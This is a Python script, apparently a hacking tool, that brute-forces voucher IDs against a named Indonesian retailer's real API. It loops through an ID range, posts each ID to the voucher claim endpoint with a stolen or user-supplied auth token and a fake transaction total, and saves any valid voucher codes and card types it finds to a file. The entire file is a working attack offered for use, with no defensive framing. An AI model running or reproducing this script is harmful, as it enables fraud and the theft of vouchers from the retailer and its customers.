import requests
import json
import yaml
import sys

''' COLOR CODE '''
CRED2 = "\33[91m"
CBLUE2 = "\33[94m"
CGREEN2 = "\033[32m"
CYELLOW2 = "\033[93m"
CCYAN2 = "\033[36m"
ENDC = "\033[0m"

def header():
    text = f"""
 {CBLUE2} _  _                 {CYELLOW2} ___         _                 _      
 {CBLUE2}| || |___  ___ _ __ __{CYELLOW2}|_ _|_ _  __| |___ _ _  ___ __(_)__ _ 
 {CBLUE2}| __ / _ \/ _ \ '_ (_-{CYELLOW2}<| || ' \/ _` / _ \ ' \/ -_|_-< / _` |
 {CBLUE2}|_||_\___/\___/ .__/__/{CYELLOW2}___|_||_\__,_\___/_||_\___/__/_\__,_|
          {CBLUE2}     |_|                                           
               
         {CCYAN2}hoopsindonesia.co.id - Voucher Brute Force{ENDC}
""" 
    return text



''' CONFIG FILE '''
info = open("config.yaml")
conf = yaml.load(info, Loader=yaml.FullLoader)

headers = {
    "Authorization": conf['token']
}

print(header())

i = int(conf['brute_id']['start'])
list_voc = []

while True:
    i += 1
    postdata = {
        "voucher_id":i,
        "check": 1,
        "transaction_total":1583200
        }
    r = requests.post("https://api.hoopsindonesia.co.id/lucky/voucher/claim", data=postdata, headers=headers)
    res = json.loads(r.text)

    try:
        if "The voucher was found successfully" not in res['messages']:
            print("[%s%s%s]%s %s %s" % (CYELLOW2, postdata['voucher_id'], ENDC, CRED2, res['messages'], ENDC))
            
        else:
            print("[%s%s%s]%s %s %s" % (CYELLOW2, postdata['voucher_id'], ENDC, CGREEN2, res['messages'], ENDC))
            f = open("result.txt", 'a')
            f.write("[ID => %s] [Voucher ID => %s] [Voucher Code => %s] [Card Type => %s] \n" % (postdata['voucher_id'], res['payload']['voucher_id'], res['payload']['voucher_code'], res['payload']['hoops_master_voucher']['card_type']))
            list_voc.append("[ID => %s] [Voucher ID => %s] [Voucher Code => %s] [Card Type => %s] \n" % (postdata['voucher_id'], res['payload']['voucher_id'], res['payload']['voucher_code'], res['payload']['hoops_master_voucher']['card_type']))
            f.close
    except Exception:
        sys.exit("Your token is wrong or maybe it has expired, please check config.yaml")

    if int(conf['brute_id']['finish']) == i:
        break

count = len(list_voc)
print("\n[%sINFO%s] Found %s voucher results on results.txt" % (CBLUE2, ENDC, count))